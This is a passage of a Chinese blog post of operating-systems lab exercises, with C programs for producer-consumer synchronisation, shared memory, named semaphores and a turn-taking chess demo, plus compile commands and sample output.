class="comment">// 初始化信号量</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_semaphores</span><span class="params">()</span> &#123;</span><br><span class="line">    sem_init(&amp;empty, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者函数</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        sem_wait(&amp;empty); <span class="comment">// 减少可用空间</span></span><br><span class="line">        sem_wait(&amp;mutex); <span class="comment">// 获取互斥锁</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生产数据并放入缓冲区</span></span><br><span class="line">        buffer[in] = val;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Produced %d\n&quot;</span>, val);</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        val++;</span><br><span class="line"></span><br><span class="line">        sem_post(&amp;mutex); <span class="comment">// 释放互斥锁</span></span><br><span class="line">        sem_post(&amp;full);  <span class="comment">// 增加可用数据</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者函数</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        sem_wait(&amp;full);  <span class="comment">// 减少可用数据</span></span><br><span class="line">        sem_wait(&amp;mutex); <span class="comment">// 获取互斥锁</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从缓冲区消费数据</span></span><br><span class="line">        <span class="type">int</span> val = buffer[out];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumed %d\n&quot;</span>, val);</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"></span><br><span class="line">        sem_post(&amp;mutex); <span class="comment">// 释放互斥锁</span></span><br><span class="line">        sem_post(&amp;empty); <span class="comment">// 增加可用空间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> prod, cons;</span><br><span class="line"></span><br><span class="line">    init_semaphores();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建生产者和消费者线程</span></span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;prod, <span class="literal">NULL</span>, producer, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to create producer thread&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;cons, <span class="literal">NULL</span>, consumer, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to create consumer thread&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待线程结束（这里假定线程不会结束）</span></span><br><span class="line">    <span class="comment">// 在实际应用中，您可能需要加入某种方式让线程能够退出</span></span><br><span class="line">    pthread_join(prod, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(cons, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁信号量</span></span><br><span class="line">    sem_destroy(&amp;empty);</span><br><span class="line">    sem_destroy(&amp;full);</span><br><span class="line">    sem_destroy(&amp;mutex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实验二：使用共享内存-信号量机制实现生产者-消费者问题"><a href="#实验二：使用共享内存-信号量机制实现生产者-消费者问题" class="headerlink" title="实验二：使用共享内存+信号量机制实现生产者-消费者问题"></a>实验二：使用共享内存+信号量机制实现生产者-消费者问题</h2><blockquote>
<p>环境：Linux-kali</p>
</blockquote>
<p>实验代码</p>
<p>productor.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用共享内存+信号量机制实现生产者-消费者问题</span></span><br><span class="line"><span class="comment">// producor.c</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> read;</span><br><span class="line">        <span class="type">int</span> write;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">&#125;shared_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> shmid;</span><br><span class="line">    shared_struct *pbuf = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="type">sem_t</span> *full,*empty,*mutex;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//initialize full,empty,mutex semaphore</span></span><br><span class="line">    full = sem_open(<span class="string">&quot;full_sem&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">0</span>);</span><br><span class="line">    empty = sem_open(<span class="string">&quot;empty_sem&quot;</span>,O_CREAT, <span class="number">0666</span>,<span class="number">10</span>);</span><br><span class="line">    mutex = sem_open(<span class="string">&quot;buf_mutex&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//shared memory</span></span><br><span class="line">    length = <span class="keyword">sizeof</span>(shared_struct);</span><br><span class="line">    <span class="comment">//create or get shared memory</span></span><br><span class="line">    shmid = shmget((<span class="type">key_t</span>)<span class="number">1234</span>,length,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    <span class="comment">//map to process space </span></span><br><span class="line">    pbuf = (shared_struct*)shmat(shmid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        sleep(rand()%<span class="number">3</span>);</span><br><span class="line">        sem_wait(empty);</span><br><span class="line">        sem_wait(mutex);</span><br><span class="line">        pbuf-&gt;buf[pbuf-&gt;write] = <span class="string">&#x27;a&#x27;</span>+ pbuf-&gt;write;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer-%d: write %c\n&quot;</span>,getpid(),pbuf-&gt;buf[pbuf-&gt;write]);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        pbuf-&gt;write = (++ pbuf-&gt;write) % <span class="number">10</span>;</span><br><span class="line">        sem_post(mutex);</span><br><span class="line">        sem_post(full);</span><br><span class="line">    &#125;</span><br><span class="line">    shmdt((<span class="type">void</span>*)pbuf);</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    shmctl(shmid,IPC_RMID,<span class="number">0</span>);</span><br><span class="line">    sem_close(full);</span><br><span class="line">    sem_close(empty);</span><br><span class="line">    sem_close(mutex);</span><br><span class="line">    sem_unlink(<span class="string">&quot;full_sem&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;empty_sem&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;buf_mutex&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>customer.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//costomer.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">    <span class="type">int</span> read;</span><br><span class="line">    <span class="type">int</span> write;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">&#125;shared_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> shmid;</span><br><span class="line">    shared_struct *pbuf = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="type">sem_t</span> *full,*empty,*mutex;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//initialize full,empty,mutex semaphore</span></span><br><span class="line">    full = sem_open(<span class="string">&quot;full_sem&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">0</span>);</span><br><span class="line">    empty = sem_open(<span class="string">&quot;empty_sem&quot;</span>,O_CREAT, <span class="number">0666</span>,<span class="number">10</span>);</span><br><span class="line">    mutex = sem_open(<span class="string">&quot;buf_mutex&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//shared memory</span></span><br><span class="line">    length = <span class="keyword">sizeof</span>(shared_struct);</span><br><span class="line">    <span class="comment">//create or get shared memory</span></span><br><span class="line">    shmid = shmget((<span class="type">key_t</span>)<span class="number">1234</span>,length,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    <span class="comment">//map to process space</span></span><br><span class="line">    pbuf = (shared_struct*)shmat(shmid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        sleep(rand()%<span class="number">3</span>);</span><br><span class="line">        sem_wait(full);</span><br><span class="line">        sem_wait(mutex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Customer-%d:read %c\n&quot;</span>,getpid(),pbuf-&gt;buf[pbuf-&gt;read]);</span><br><span class="line"></span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        pbuf-&gt;buf[pbuf-&gt;read] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">        pbuf-&gt;read = (++pbuf-&gt;read) % <span class="number">10</span>;</span><br><span class="line">        sem_post(mutex);</span><br><span class="line">        sem_post(empty);</span><br><span class="line">    &#125;</span><br><span class="line">    shmdt((<span class="type">void</span>*)pbuf);</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    shmctl(shmid,IPC_RMID,<span class="number">0</span>);</span><br><span class="line">    sem_close(full);</span><br><span class="line">    sem_close(empty);</span><br><span class="line">    sem_close(mutex);</span><br><span class="line">    sem_unlink(<span class="string">&quot;full_sem&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;empty_sem&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;buf_mutex&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –o producer producer.c –lrt</span><br><span class="line">gcc –o customer customer.c –lrt</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./producer &amp; ./producer &amp; ./customer &amp; ./customer  </span><br></pre></td></tr></table></figure>

<p>实验结果：</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/consumer_prot.png" alt="consumer_prot"></p>
<h2 id="实验三：使用信号量进行互斥与同步"><a href="#实验三：使用信号量进行互斥与同步" class="headerlink" title="实验三：使用信号量进行互斥与同步"></a>实验三：使用信号量进行互斥与同步</h2><blockquote>
<p>实验目的：</p>
<p>Ø进一步加深理解进程同步、互斥的概念</p>
<p>Ø进一步理解临界区、临界资源的概念</p>
</blockquote>
<h3 id="no-sem"><a href="#no-sem" class="headerlink" title="no_sem"></a>no_sem</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//no_sem.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> message = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(argc&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        message = argv[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,message);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        sleep(rand()%<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,message);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        sleep(rand()%<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码过程及结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//编译</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/OS/mutex]</span><br><span class="line">└─# gcc -o no_sem no_sem.c -lrt</span><br><span class="line">//运行</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/OS/mutex]</span><br><span class="line">└─# ls</span><br><span class="line">no_sem  no_sem.c  with_sem  with_sem.c</span><br><span class="line">                                                                                        </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/OS/mutex]</span><br><span class="line">└─# ./no_sem &amp; ./no_sem o          </span><br><span class="line">[1] 437762</span><br><span class="line">XoXXXoooXoXoXoXXXoooXoXoXoXoXoXXoXoXooXo[1]  + done       ./no_sem</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="with-sem"><a href="#with-sem" class="headerlink" title="with_sem"></a>with_sem</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">char</span> message = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        message = argv[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">sem_t</span> *mutex = sem_open(<span class="string">&quot;mysem&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        sem_wait(mutex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,message);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        sleep(rand()%<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,message);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        sem_post(mutex);</span><br><span class="line">        sleep(rand()%<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    sem_close(mutex);</span><br><span class="line">    sem_unlink(<span class="string">&quot;mysem&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码过程及结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//编译</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/OS/mutex]</span><br><span class="line">└─<span class="comment"># gcc -o with_sem with_sem.c -lrt</span></span><br><span class="line">//运行</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/OS/mutex]</span><br><span class="line">└─<span class="comment"># ./with_sem &amp; ./with_sem o</span></span><br><span class="line">[1] 1819</span><br><span class="line">ooXXooXXooXXooXXooXXooXXooXXooXXooXXooXX    [1]  + <span class="keyword">done</span>       ./with_sem</span><br></pre></td></tr></table></figure>

<h3 id="chess"><a href="#chess" class="headerlink" title="chess"></a>chess</h3><h4 id="red-chess"><a href="#red-chess" class="headerlink" title="red_chess"></a>red_chess</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">sem_t</span> *black = sem_open(<span class="string">&quot;chess_black_sem&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="type">sem_t</span> *red = sem_open(<span class="string">&quot;chess_red_sem&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        sem_wait(black);</span><br><span class="line">        <span class="keyword">if</span>(i != <span class="number">9</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Red chess had moved,black chess go!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Red chess Win!!!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        sem_post(red);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    sem_close(black);</span><br><span class="line">    sem_close(red);</span><br><span class="line">    sem_unlink(<span class="string">&quot;chess_red_sem&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;chess_black_sem&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="black-chess"><a href="#black-chess" class="headerlink" title="black_chess"></a>black_chess</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">sem_t</span> *black = sem_open(<span class="string">&quot;chess_black_sem&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="type">sem_t</span> *red = sem_open(<span class="string">&quot;chess_red_sem&quot;</span>,O_CREAT,<span class="number">0666</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        sem_wait(red);</span><br><span class="line">        <span class="keyword">if</span>(i != <span class="number">9</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Black chess had moved, red chess go!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Black chess lost!!!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        sem_post(black);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    sem_close(black);</span><br><span class="line">    sem_close(red);</span><br><span class="line">    sem_unlink(<span class="string">&quot;chess_red_sem&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;chess_black_sem&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行过程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/OS/chess]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">black_chess  black_chess.c  red_chess  red_chess.c</span><br><span class="line"> //编译                                                                                     </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/OS/chess]</span><br><span class="line">└─<span class="comment"># gcc -o red_chess red_chess.c -lrt </span></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/OS/chess]</span><br><span class="line">└─<span class="comment"># gcc -o black_chess black_chess.c -lrt </span></span><br><span class="line">//结果</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/OS/chess]</span><br><span class="line">└─<span class="comment"># ./red_chess &amp; ./black_chess</span></span><br><span class="line">[1] 5815</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess had moved,black chess go!</span><br><span class="line">Black chess had moved, red chess go!</span><br><span class="line">Red chess Win!!!</span><br><span class="line">Black chess lost!!!</span><br><span class="line">[1]  + <span class="keyword">done</span>       ./red_chess</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="课程设计"><a href="#课程设计" class="headerlink" title="课程设计"></a>课程设计</h2><p>设计内容</p>
<p>设计代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*模拟实现生产者——消费者问题*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span>      <span class="comment">// 用于键盘交互</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>     <span class="comment">// 用于 memset 初始化缓冲区</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span>       <span class="comment">// 用于随机数种子生成</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 20          <span class="comment">// 缓冲区大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRODUCER_COUNT 3        <span class="comment">// 生产者数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONSUMER_COUNT 3        <span class="comment">// 消费者数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SLEEP_TIME 3000     <span class="comment">// 最大休眠时间（ms）</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> buffer[BUFFER_SIZE];    <span class="comment">// 缓冲区数组</span></span><br><span class="line">    <span class="type">int</span> in;                     <span class="comment">// 入口指针</span></span><br><span class="line">    <span class="type">int</span> out;                    <span class="comment">// 出口指针</span></span><br><span class="line">    <span class="type">int</span> count;                  <span class="comment">// 当前缓冲区中的数据量</span></span><br><span class="line">&#125; Buffer;</span><br><span 